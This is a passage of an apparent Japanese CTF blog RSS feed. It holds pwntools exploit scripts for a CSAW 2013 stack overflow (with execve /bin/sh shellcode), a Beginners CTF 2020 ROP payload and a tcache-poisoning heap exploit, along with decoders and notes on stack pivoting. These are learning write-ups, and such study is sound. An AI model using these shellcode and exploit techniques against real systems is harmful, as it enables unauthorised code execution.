class=&quot;synPreProc&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;
listen&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;
rt_sigaction&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;SIGCHLD, {&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sa_handler&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;0x80487e4, &lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sa_mask&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;[], &lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;sa_flags&lt;/span&gt;=&lt;span class=&quot;synSpecial&quot;&gt;SA_RESTART}, NULL, &lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;
accept&lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;, &lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;bind,listen,acceptしている。&lt;br&gt;
バイナリはacceptで外部クライアントからの接続待ちをし、接続されるとfork()を呼び出すことでクライアントの処理を別プロセスに渡す。&lt;br&gt;こうすることで親プロセスとあるクライアントが接続している間に別のクライアントが接続できない事態を避けている。(多分)&lt;br&gt;
ちなみにsin_port=htons(31338)からポート番号が31338だとわかる。&lt;/p&gt;

&lt;p&gt;次にexploit2を実行した状態で別のターミナルから接続を行う。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;pc@surface-pro-3:~$ nc localhost 31338
�:��D��Welcome to CSAW CTF.  Exploitation 2 will be a little harder this year.  Insert your exploit here:&lt;/pre&gt;


&lt;p&gt;よくわからない文字列が表示された後、入力を受け付ける。
ちなみにこの文字列はhexdumpで確認すると8byteある。&lt;br&gt;
&lt;br&gt;
続いてこのバイト列の正体を知りたいので、IDAを使って見ていく。
IDAでhandleという関数に以下の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;を発見できる。&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;.text:0804880D ; Attributes: bp-based frame
.text:0804880D
.text:0804880D ; void __cdecl handle(int newsock)
.text:0804880D                 public handle
.text:0804880D handle          proc near               ; CODE XREF: main+2A9↓p
.text:0804880D
.text:0804880D buffer          = byte ptr -80Ch
.text:0804880D cookie          = dword ptr -0Ch
.text:0804880D newsock         = dword ptr  8
.text:0804880D
.text:0804880D                 push    ebp
.text:0804880E                 mov     ebp, esp
.text:08048810                 push    edi
.text:08048811                 push    ebx
.text:08048812                 sub     esp, 820h
.text:08048818                 mov     [ebp+cookie], 0
.text:0804881F                 lea     eax, [ebp+buffer]
.text:08048825                 mov     ebx, eax
.text:08048827                 mov     eax, 0
.text:0804882C                 mov     edx, 200h
.text:08048831                 mov     edi, ebx
.text:08048833                 mov     ecx, edx
.text:08048835                 rep stosd
.text:08048837                 mov     dword ptr [esp], 0
.text:0804883E                 call    _time
.text:08048843                 mov     [esp], eax
.text:08048846                 call    _srand
.text:0804884B                 call    _rand
.text:08048850                 mov     ds:secret, eax
.text:08048855                 mov     eax, ds:secret
.text:0804885A                 mov     [ebp+cookie], eax
.text:0804885D                 lea     eax, [ebp+buffer]
.text:08048863                 lea     edx, [ebp+buffer]
.text:08048869                 mov     [eax], edx
.text:0804886B                 mov     dword ptr [esp+0Ch], 0
.text:08048873                 mov     dword ptr [esp+8], 4
.text:0804887B                 lea     eax, [ebp+buffer]
.text:08048881                 mov     [esp+4], eax
.text:08048885                 mov     eax, [ebp+newsock]
.text:08048888                 mov     [esp], eax
.text:0804888B                 call    _send
.text:08048890                 mov     dword ptr [esp+0Ch], 0
.text:08048898                 mov     dword ptr [esp+8], 4
.text:080488A0                 lea     eax, [ebp+cookie]
.text:080488A3                 mov     [esp+4], eax
.text:080488A7                 mov     eax, [ebp+newsock]
.text:080488AA                 mov     [esp], eax
.text:080488AD                 call    _send
.text:080488B2                 mov     dword ptr [esp+0Ch], 0
.text:080488BA                 mov     dword ptr [esp+8], 63h
.text:080488C2                 mov     dword ptr [esp+4], offset aWelcomeToCsawC ; &amp;#34;Welcome to CSAW CTF.  Exploitation 2 wi&amp;#34;...
.text:080488CA                 mov     eax, [ebp+newsock]
.text:080488CD                 mov     [esp], eax
.text:080488D0                 call    _send
.text:080488D5                 mov     dword ptr [esp+0Ch], 0
.text:080488DD                 mov     dword ptr [esp+8], 1000h
.text:080488E5                 lea     eax, [ebp+buffer]
.text:080488EB                 mov     [esp+4], eax
.text:080488EF                 mov     eax, [ebp+newsock]
.text:080488F2                 mov     [esp], eax
.text:080488F5                 call    _recv
.text:080488FA                 mov     [ebp+buffer+7FFh], 0
.text:080488FE                 mov     edx, [ebp+cookie]
.text:08048901                 mov     eax, ds:secret
.text:08048906                 cmp     edx, eax
.text:08048908                 jz      short loc_8048921&lt;/pre&gt;


&lt;p&gt;これがおそらく子プロセスの処理だろう。&lt;br&gt;
 &quot;Welcome to CSAW CTF.  Exploitation 2 wi&quot;.の部分から察するに、call sendによって[esp+4]をクライアントに送信している。&lt;br&gt;
全体でsendが3つあるので、最初の二つ(bufferの先頭アドレスとsecretの値)が「よくわからんバイト列」に当たる。&lt;br&gt;&lt;br&gt;
頑張って読んでみると、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/cookie&quot;&gt;cookie&lt;/a&gt;にsecret(rand)の値が入り、(recvで受け取った)入力値はbufferに入ることがわかる。&lt;/p&gt;

&lt;p&gt;最後のcmpでsecretと&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/cookie&quot;&gt;cookie&lt;/a&gt;の値を照合している。&lt;br&gt;
つまり、自前でstack canaryを実装していることになる。&lt;br&gt;&lt;/p&gt;

&lt;p&gt;以上を踏まえると、canaryの値を変更しないようにリターンアドレスをシェルコードに向けて書き換えればよい。&lt;/p&gt;

&lt;p&gt;エクスプロイトコード&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; *
context(os=&lt;span class=&quot;synConstant&quot;&gt;&#39;linux&#39;&lt;/span&gt;, arch=&lt;span class=&quot;synConstant&quot;&gt;&#39;i386&#39;&lt;/span&gt;)

p = remote(&lt;span class=&quot;synConstant&quot;&gt;&#39;localhost&#39;&lt;/span&gt;,&lt;span class=&quot;synConstant&quot;&gt;31338&lt;/span&gt;)

shellcode=&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;

buf_addr=(p.recv(&lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;))
secret=(p.recv(&lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;))

payload=&lt;span class=&quot;synConstant&quot;&gt;&#39;&#39;&lt;/span&gt;
payload+=shellcode
payload+=&lt;span class=&quot;synConstant&quot;&gt;&#39;A&#39;&lt;/span&gt;*(&lt;span class=&quot;synConstant&quot;&gt;0x800&lt;/span&gt;-&lt;span class=&quot;synIdentifier&quot;&gt;len&lt;/span&gt;(shellcode))
payload+=secret
payload+=&lt;span class=&quot;synConstant&quot;&gt;&#39;A&#39;&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;12&lt;/span&gt;
payload+=buf_addr
p.sendline(payload)

p.interactive()
&lt;/pre&gt;


&lt;p&gt;実行結果&lt;br&gt;
exploit2を実行しているターミナルで&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bash&quot;&gt;bash&lt;/a&gt;が起動する。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;pc@surface-pro-3:~/pwn/csaw2013$ ./exploit2
Got a connection from &lt;span class=&quot;synConstant&quot;&gt;127&lt;/span&gt;.&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt; on port &lt;span class=&quot;synConstant&quot;&gt;33280&lt;/span&gt;
$ &lt;span class=&quot;synStatement&quot;&gt;ls&lt;/span&gt;
e2.py     exploit2.id0  exploit2.id2  exploit2.til  miteegashun
exploit2  exploit2.id1  exploit2.nam  fil_chal
$ 
&lt;/pre&gt;

</description>          <pubDate>Thu, 28 May 2020 21:12:31 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613575605796</guid>
          
            <category>CTF pwn</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613575605796/1638952752" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>Beginners CTF 2020 [writeup]</title>
          <link>https://tamaron.hatenablog.com/entry/2020/05/24/142003</link>          <description>&lt;p&gt;以下の解けた問題のみwriteupを載せます。&lt;br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;[pwn] Beginner&#39;s Stack&lt;br&gt;&lt;/li&gt;
&lt;li&gt;[pwn] Beginner&#39;s Heap&lt;br&gt;&lt;/li&gt;
&lt;li&gt;[crypto] &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/R%26amp%3BB&quot;&gt;R&amp;amp;B&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;[misc] emoemoencode&lt;br&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;Beginner&#39;s Stack&lt;/h2&gt;

&lt;p&gt;プログラム実行前後のスタックの状態がダンプされるようになっている。
リターンアドレスとbufferのオフセットを考えれば&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;payload=&lt;span class=&quot;synConstant&quot;&gt;&#39;&#39;&lt;/span&gt;
payload+=&lt;span class=&quot;synConstant&quot;&gt;&#39;A&#39;&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;
payload+=p64(&lt;span class=&quot;synConstant&quot;&gt;0x00400861&lt;/span&gt;)
&lt;/pre&gt;


&lt;p&gt;のような&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9&quot;&gt;ペイロード&lt;/a&gt;を送ればよいとわかる。
しかし、実行してみると、&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;Oops! RSP is misaligned!
Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
This instruction fails when RSP is not a multiple of 0x10.
Find a way to align RSP! You&amp;#39;re almost there!&lt;/pre&gt;


&lt;p&gt;と怒られてしまう。
win呼び出し時にスタック&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DD%A5%A4%A5%F3%A5%BF%A1%BC&quot;&gt;ポインター&lt;/a&gt;の値が0x10の倍数でないといけないらしい。ここで第一に書き換えるべきリターンアドレスの配置場所は0x00007ffde2cb48f8であるからこれをどうにか8byteずらせばよい。
retがあれば、
win呼び出し時のespが8byteだけずらすことが出来る。
&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gdb&quot;&gt;gdb&lt;/a&gt;-pedaのropgadgetコマンドを用いてretを探す。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;gdb-peda$ ropgadget
ret = 0x400626
popret = 0x400728
addesp_8 = 0x400623&lt;/pre&gt;


&lt;p&gt;したがってエクスプロイトコードは以下&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; *
context(os=&lt;span class=&quot;synConstant&quot;&gt;&#39;linux&#39;&lt;/span&gt;, arch=&lt;span class=&quot;synConstant&quot;&gt;&#39;i386&#39;&lt;/span&gt;)

p = remote(&lt;span class=&quot;synConstant&quot;&gt;&#39;bs.quals.beginners.seccon.jp&#39;&lt;/span&gt;,&lt;span class=&quot;synConstant&quot;&gt;9001&lt;/span&gt;)

payload=&lt;span class=&quot;synConstant&quot;&gt;&#39;&#39;&lt;/span&gt;
payload+=&lt;span class=&quot;synConstant&quot;&gt;&#39;A&#39;&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;
payload+=p64(&lt;span class=&quot;synConstant&quot;&gt;0x00400626&lt;/span&gt;)
payload+=p64(&lt;span class=&quot;synConstant&quot;&gt;0x00400861&lt;/span&gt;)

p.sendline(payload)
p.interactive()
&lt;/pre&gt;


&lt;h2&gt;Beginner&#39;s Heap&lt;/h2&gt;

&lt;p&gt;heapの動作原理の理解が深まる問題だった。
作問者様のwriteupがわかりやすかったのでそちらを参考にされたい。
以下エクスプロイトコードと重要事項のみ書いておきます。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;chunk headerの構造をおさえる&lt;/li&gt;
&lt;li&gt;tcacheはUSEなchunkのfree時にサイズごとに単方向リストに連結する仕組み&lt;/li&gt;
&lt;li&gt;fdはFREEなchunkのwilderness(data本体)を指し示す&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/malloc&quot;&gt;malloc&lt;/a&gt;時に&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/malloc&quot;&gt;malloc&lt;/a&gt;されるchunkのfdがリストすなわちtcacheに連結される&lt;/li&gt;
&lt;li&gt;今回はheaderのsizeを偽装することでfree時に別のサイズ用のtcacheに連結させられる&lt;/li&gt;
&lt;/ul&gt;


&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; *
&lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; time

context(os=&lt;span class=&quot;synConstant&quot;&gt;&#39;linux&#39;&lt;/span&gt;, arch=&lt;span class=&quot;synConstant&quot;&gt;&#39;i386&#39;&lt;/span&gt;)

p = remote(&lt;span class=&quot;synConstant&quot;&gt;&#39;bh.quals.beginners.seccon.jp&#39;&lt;/span&gt;,&lt;span class=&quot;synConstant&quot;&gt;9002&lt;/span&gt;)

&lt;span class=&quot;synStatement&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;write&lt;/span&gt;(s):
    p.sendline(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)
    time.sleep(&lt;span class=&quot;synConstant&quot;&gt;0.1&lt;/span&gt;)
    p.sendline(&lt;span class=&quot;synIdentifier&quot;&gt;str&lt;/span&gt;(s))
    time.sleep(&lt;span class=&quot;synConstant&quot;&gt;0.1&lt;/span&gt;)

&lt;span class=&quot;synStatement&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;malloc&lt;/span&gt;(s):
    p.sendline(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)
    time.sleep(&lt;span class=&quot;synConstant&quot;&gt;0.1&lt;/span&gt;)
    p.sendline(&lt;span class=&quot;synIdentifier&quot;&gt;str&lt;/span&gt;(s))
    time.sleep(&lt;span class=&quot;synConstant&quot;&gt;0.1&lt;/span&gt;)

&lt;span class=&quot;synStatement&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;free&lt;/span&gt;():
    p.sendline(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)
    time.sleep(&lt;span class=&quot;synConstant&quot;&gt;0.1&lt;/span&gt;)

p.recvuntil(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;hook&amp;gt;: &amp;quot;&lt;/span&gt;)
free_hook=&lt;span class=&quot;synIdentifier&quot;&gt;int&lt;/span&gt;(p.recv(&lt;span class=&quot;synConstant&quot;&gt;14&lt;/span&gt;),&lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;)

p.recvuntil(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;win&amp;gt;: &amp;quot;&lt;/span&gt;)
win=&lt;span class=&quot;synIdentifier&quot;&gt;int&lt;/span&gt;(p.recv(&lt;span class=&quot;synConstant&quot;&gt;14&lt;/span&gt;),&lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;)

malloc(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;)
free()

payload=p64(&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;)*&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;
payload+=p64(&lt;span class=&quot;synConstant&quot;&gt;0x31&lt;/span&gt;)
payload+=p64(free_hook)
write(payload)

malloc(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;)

free()

malloc(p64(win))

free()

p.interactive()
&lt;/pre&gt;


&lt;h2&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/R%26amp%3BB&quot;&gt;R&amp;amp;B&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;フラグは以下の手順にそって&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;される&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rot13で&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;した後に先頭にRを付す&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/base64&quot;&gt;base64&lt;/a&gt;で&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;した後に先頭にBを付す&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;したがってencoded_flagの先頭がBなので先頭のBを取り除いた文字列を&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/base64&quot;&gt;base64&lt;/a&gt;でデコード&lt;br&gt;
→さらに得られた文字列の先頭がBならばさらに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/base64&quot;&gt;base64&lt;/a&gt;でデコード...&lt;br&gt;
という風にすればよい。&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; base64
&lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; codecs

nexts=&lt;span class=&quot;synConstant&quot;&gt;&#39;BQlVrOUllRGxXY2xGNVJuQjRkVFZ5U0VVMGNVZEpiRVpTZVZadmQwOWhTVEIxTkhKTFNWSkdWRUZIUlRGWFUwRklUVlpJTVhGc1NFaDFaVVY1Ukd0Rk1qbDFSM3BuVjFwNGVXVkdWWEZYU0RCTldFZ3dRVmR5VVZOTGNGSjFTMjR6VjBWSE1rMVRXak5KV1hCTGVYZEplR3BzY0VsamJFaGhlV0pGUjFOUFNEQk5Wa1pIVFZaYVVqRm9TbUZqWVhKU2NVaElNM0ZTY25kSU1VWlJUMkZJVWsxV1NESjFhVnBVY0d0R1NIVXhUVEJ4TmsweFYyeEdNVUUxUlRCNVIwa3djVmRNYlVGclJUQXhURVZIVGpWR1ZVOVpja2x4UVZwVVFURkZVblZYYmxOaWFrRktTVlJJWVhsTFJFbFhRVUY0UlZkSk1YRlRiMGcwTlE9PQ==&#39;&lt;/span&gt;

&lt;span class=&quot;synStatement&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;True&lt;/span&gt;:
    top=nexts[&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;]
    encoded_string=nexts[&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;:]

    &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; top==&lt;span class=&quot;synConstant&quot;&gt;&#39;B&#39;&lt;/span&gt; :
        nexts=base64.b64decode(encoded_string.encode(&lt;span class=&quot;synConstant&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;))
    &lt;span class=&quot;synStatement&quot;&gt;elif&lt;/span&gt; top==&lt;span class=&quot;synConstant&quot;&gt;&#39;R&#39;&lt;/span&gt; :
        nexts=codecs.decode(encoded_string,&lt;span class=&quot;synConstant&quot;&gt;&#39;rot13&#39;&lt;/span&gt;)
    &lt;span class=&quot;synStatement&quot;&gt;else&lt;/span&gt; :
        &lt;span class=&quot;synStatement&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;synIdentifier&quot;&gt;print&lt;/span&gt;(nexts)
&lt;/pre&gt;


&lt;h2&gt;emoemoencode&lt;/h2&gt;

&lt;p&gt;問題文↓(❓)&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽&lt;/pre&gt;


&lt;p&gt;ググってもそんな&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;方式存在しなかった...。&lt;br&gt;
まず&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%CA%B8%BB%FA%A5%B3%A1%BC%A5%C9&quot;&gt;文字コード&lt;/a&gt;を何らかの方法で変換していると予測。
一文字目から順に&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;を確認する。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;“🍣” (U+1F363)
“🍴” (U+1F374) 
...&lt;/pre&gt;


&lt;p&gt;これに対し、変換元の文字列はctf4b{~}の形式だろうから&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;&amp;#34;c&amp;#34; (U+0063)
&amp;#34;t&amp;#34; (U+0074)
...&lt;/pre&gt;


&lt;p&gt;これより下二桁のみに注目すれば良いとわかる。&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/python&quot;&gt;python&lt;/a&gt;で以下のような&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;を実行すれば良い。&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;s=&lt;span class=&quot;synConstant&quot;&gt;&#39;🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽&#39;&lt;/span&gt;
a=&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; t &lt;span class=&quot;synStatement&quot;&gt;in&lt;/span&gt; s:
   a+=&lt;span class=&quot;synIdentifier&quot;&gt;chr&lt;/span&gt;(&lt;span class=&quot;synIdentifier&quot;&gt;ord&lt;/span&gt;(t)%&lt;span class=&quot;synConstant&quot;&gt;128&lt;/span&gt;)

&lt;span class=&quot;synIdentifier&quot;&gt;print&lt;/span&gt;(a)
&lt;/pre&gt;

</description>          <pubDate>Sun, 24 May 2020 14:20:03 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613572625253</guid>
          
            <category>CTF pwn</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613572625253/1638952768" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>エクスプロイトにおけるStack Pivotingについて</title>
          <link>https://tamaron.hatenablog.com/entry/2020/04/24/142309</link>          <description>&lt;h1&gt;stack pivotingとは&lt;/h1&gt;

&lt;p&gt;stack領域をheapなどの別の領域に移すこと。&lt;/p&gt;

&lt;h1&gt;モチベーション&lt;/h1&gt;

&lt;p&gt;stack based &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BoF&quot;&gt;BoF&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD&quot;&gt;脆弱性&lt;/a&gt;が存在し、stack canaryが無効のときROPなどでstack内に大きな領域が必要な場合がある。&lt;br&gt;
そのとき、さらに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BoF&quot;&gt;BoF&lt;/a&gt;できる量が限られてる場合の回避方法となる。&lt;/p&gt;

&lt;h1&gt;手法&lt;/h1&gt;

&lt;p&gt;以下、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BoF&quot;&gt;BoF&lt;/a&gt;によるリターンアドレスが任意に書き換え可能、PIE,stack canary無効、ASLR有効とする。&lt;/p&gt;

&lt;p&gt;例えば以下のガジェットを組み合わせてできる。&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;synComment&quot;&gt;; ret&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;synComment&quot;&gt;; ret&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;またstackを移すrwな別の領域が&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/malloc&quot;&gt;malloc&lt;/a&gt;などで確保されている必要がある。&lt;br&gt;
↑stack &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/growth&quot;&gt;growth&lt;/a&gt;&lt;br&gt;
+-+-+-+-+-+-+-+-&lt;br&gt;
pop eax; ret &lt;br&gt;(return addr)&lt;br&gt;
+-+-+-+-+-+-+-+-&lt;br&gt;
allocated memory addr&lt;br&gt;
+-+-+-+-+-+-+-+-&lt;br&gt;
xchg esp,eax;ret&lt;br&gt;
+-+-+-+-+-+-+-+-&lt;br&gt;
&lt;br&gt;
上のような状態を考えればxchg実行後スタック&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DD%A5%A4%A5%F3%A5%BF%A1%BC&quot;&gt;ポインター&lt;/a&gt;が別領域を指すように書き換えられるので、別領域からスタックの続きが始まるとわかる。&lt;/p&gt;
</description>          <pubDate>Fri, 24 Apr 2020 14:23:09 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613555438337</guid>
          
            <category>CTF pwn</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613555438337/1638952784" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>x86におけるスタック操作</title>
          <link>https://tamaron.hatenablog.com/entry/2020/04/02/003805</link>          <description>&lt;p&gt;自分用メモ&lt;/p&gt;

